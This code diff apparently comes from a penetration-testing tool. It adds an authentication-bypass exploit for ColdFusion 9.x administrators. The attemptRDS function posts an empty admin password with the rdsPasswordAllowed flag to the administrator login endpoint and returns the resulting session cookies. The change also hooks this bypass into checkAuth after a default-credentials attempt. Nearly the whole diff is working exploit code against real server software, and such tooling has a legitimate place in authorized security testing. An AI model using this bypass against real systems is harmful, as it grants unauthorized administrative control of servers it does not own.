@@ -57,6 +57,30 @@ def _auth(usr, pswd, url, version):
         return (None, None)
 
 
+def attemptRDS(ip, port):
+    """ If version 9.x is found, we attempt to bypass authentication using
+    the RDS vulnerability (CVS-2013-0632)            
+    """
+
+    utility.Msg("Attempting RDS bypass...", LOG.DEBUG)           
+    url = "http://{0}:{1}".format(ip, port)
+    uri = "/CFIDE/adminapi/administrator.cfc?method=login"
+    data = {
+             "adminpassword" : '',
+             "rdsPasswordAllowed" : 1
+           }
+
+    response = utility.requests_post(url + uri, data)
+    if response.status_code is 200 and "true" in response.content:
+        return (dict_from_cookiejar(response.cookies), None)
+    else:
+        # try it with rdsPasswordAllowed = 0
+        data['rdsPasswordAllowed'] = 0
+        response = utility.requests_post(url + uri, data)
+        if response.status_code is 200 and "true" in response.content:
+            return (dict_from_cookiejar(response.cookies), None)
+
+
 def checkAuth(ip, port, title, version):
     """
     """
@@ -71,6 +95,12 @@ def checkAuth(ip, port, title, version):
     # else try default creds
     for (usr, pswd) in default_credentials:
         cook = _auth(usr, pswd, url, version)
+        if cook:
+            return cook
+
+    # if we're 9.x, we can use the RDS bypass
+    if version in ["9.0"]:
+        cook = attemptRDS(ip, port)
         if cook:
             return cook
 
